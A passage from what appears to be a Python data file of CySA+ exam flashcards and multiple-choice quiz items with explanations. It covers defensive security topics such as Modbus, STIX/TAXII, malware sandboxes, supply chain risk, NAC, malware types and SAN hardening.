  ["Modbus encrypts traffic, so it cannot be inspected", "Modbus has no authentication, so any reachable device can change the process", "Modbus only runs on serial lines", "Write commands are always malicious"],
  1, "Modbus trusts whoever can reach it. An unknown host issuing writes could be changing a physical process, so it is investigated as a possible attack even before intent is known."),
 ("1.4", "What is the difference between STIX and TAXII?",
  ["STIX is a protocol; TAXII is a format", "STIX is a format for describing threat intelligence; TAXII is a protocol for exchanging it", "Both are threat intelligence platforms", "STIX is for vulnerabilities; TAXII is for malware"],
  1, "STIX describes the intelligence; TAXII carries it. They are designed to be used together."),
]

# ---------------------------------------------------------------------------
# Added 2026-10-26 after a scope read of the Sybex study guide (outlines and
# Exam Essentials only). EXAM: 1.3 Joe Sandbox and Cuckoo Sandbox; 1.4 supply
# chain (vendor due diligence, hardware source authenticity). GENERAL
# KNOWLEDGE: NAC, threat-source categories. Original prose.
# ---------------------------------------------------------------------------

FLASHCARDS += [
 ("1.3", "Joe Sandbox versus Cuckoo Sandbox.",
  "Both detonate a suspicious file or URL in an instrumented virtual machine and report what it does: processes created, files and Registry keys written, network connections, dropped payloads. Cuckoo is open source and self-hosted, so samples stay in-house. Joe Sandbox is a commercial service (cloud or on-premises) with deep reporting and anti-evasion features. Either way, malware that detects the sandbox can stay quiet, so a clean result is not proof of safety."),
 ("1.4", "How does an organization manage supply chain risk from vendors?",
  "Vendor due diligence before and during the relationship: security questionnaires, audits and attestations (such as SOC 2 reports), contract terms covering breach notification and right to audit, and ongoing monitoring. For hardware, verify source authenticity: buy through authorized channels, check tamper-evident packaging and serial numbers, and validate firmware, because devices can be altered after they leave the manufacturer."),
]

QUIZ += [
 ("1.3", "An analyst must detonate a suspicious attachment that may contain confidential customer data and cannot leave the company. Which choice fits?",
  ["Upload it to a public multiscanner", "A self-hosted Cuckoo Sandbox instance", "Open it on an analyst workstation with antivirus enabled", "Submit only its hash to VirusTotal and treat no hits as clean"],
  1, "A self-hosted sandbox analyzes behavior without sending the file outside. Public services share submissions. A hash lookup only finds known samples, and opening the file on a workstation is the infection you are trying to avoid."),
 ("1.4", "A batch of network switches arrives through an unfamiliar reseller at a steep discount, and the packaging seals look disturbed. What is the best response?",
  ["Install them; switches are commodity hardware", "Quarantine them and verify authenticity with the manufacturer (serials, firmware) before use", "Reflash the firmware and deploy", "Return one unit and keep the rest"],
  1, "Gray-market sourcing plus broken seals are classic supply chain red flags. Verify serial numbers and firmware integrity with the manufacturer before the devices touch the network. Reflashing does not address tampered hardware."),
]

GK_FLASHCARDS += [
 ("1.1", "What does network access control (NAC) enforce?",
  "Two things at the point of connection: that the user or device is authorized (often 802.1X against RADIUS), and that the device meets a security baseline (patched, endpoint protection running, approved OS). Non-compliant devices are blocked or placed on a quarantine VLAN until remediated. Agents give deeper posture checks; agentless NAC suits devices that cannot run software."),
 ("1.4", "Name the four categories of threat sources in NIST's risk assessment guidance.",
  "Adversarial: people or groups deliberately attacking.\nAccidental: well-meaning people making mistakes.\nStructural: equipment, software or environmental controls failing from age, overload or defects.\nEnvironmental: natural or human-made disasters outside the organization's control.\nRisk planning that only considers attackers misses the other three."),
]

# ---------------------------------------------------------------------------
# GENERAL KNOWLEDGE added 2026-10-26 from the Skillsoft transcripts Malware
# Threats, Hardening Techniques and Data Security Standards (not on the CS0-003
# objectives; checked against cysa-spine.json). Original prose.
# ---------------------------------------------------------------------------

GK_FLASHCARDS += [
 ("1.2", "Common malware types and what sets each apart.",
  "Virus: attaches to a host file and needs it to run.\nWorm: spreads across the network by itself.\nTrojan: pretends to be legitimate software.\nRAT: a trojan that gives remote control.\nRootkit: hides itself and other malware, often at kernel or boot level.\nSpyware and keyloggers: steal information quietly.\nRansomware: encrypts data (and often steals it first) for extortion.\nFileless malware: runs in memory through legitimate tools such as PowerShell, leaving little on disk.\nLogic bomb: waits for a trigger condition."),
 ("1.2", "How have malware and botnets become commodities?",
  "Criminal markets now sell ready-made tooling: ransomware-as-a-service (developers supply the malware and take a cut of each ransom), malware and exploit kits, access brokers selling footholds, and botnets rented by the hour for DDoS, spam or credential stuffing. The skill barrier has fallen, so organizations face more attackers using more capable tools."),
 ("1.3", "What are the Social-Engineer Toolkit (SET) and Malzilla used for?",
  "SET is an open-source framework for authorized social engineering tests: it builds phishing emails, cloned credential-harvesting sites and malicious payloads to measure how staff respond. Malzilla is an older tool for safely examining malicious web pages: fetching them, following redirects and decoding obfuscated JavaScript. Running SET against people without written authorization is an attack, not a test."),
 ("1.1", "How do iSCSI and Fibre Channel SANs need to be secured?",
  "iSCSI carries storage over ordinary IP networks (TCP 3260), so isolate it on its own VLAN or network, require CHAP authentication, and consider IPsec. Fibre Channel uses dedicated switches and host bus adapters (HBAs); secure it with zoning (which ports can talk to which) and LUN masking (which hosts see which logical units). An unmasked LUN can expose a whole volume to the wrong server."),
 ("1.1", "What does WSUS do, and why do organizations use it?",
  "Windows Server Update Services downloads Microsoft updates once and distributes them internally. Administrators approve updates per group, for example testing first and production after, and see which computers are missing which patches. Group Policy points clients at the WSUS server. Cloud fleets use tools such as Azure Update Manager for the same job."),
 ("1.1", "Why is physical security part of data security?",
  "Every system ultimately runs on hardware someone can touch. Physical access defeats many logical controls: booting from USB, pulling drives, planting keyloggers or rogue devices, stealing laptops and backup media. Layered physical controls (perimeter, badges, locked racks, cameras, visitor logs) and full-disk encryption on anything that leaves the building close that gap."),
]
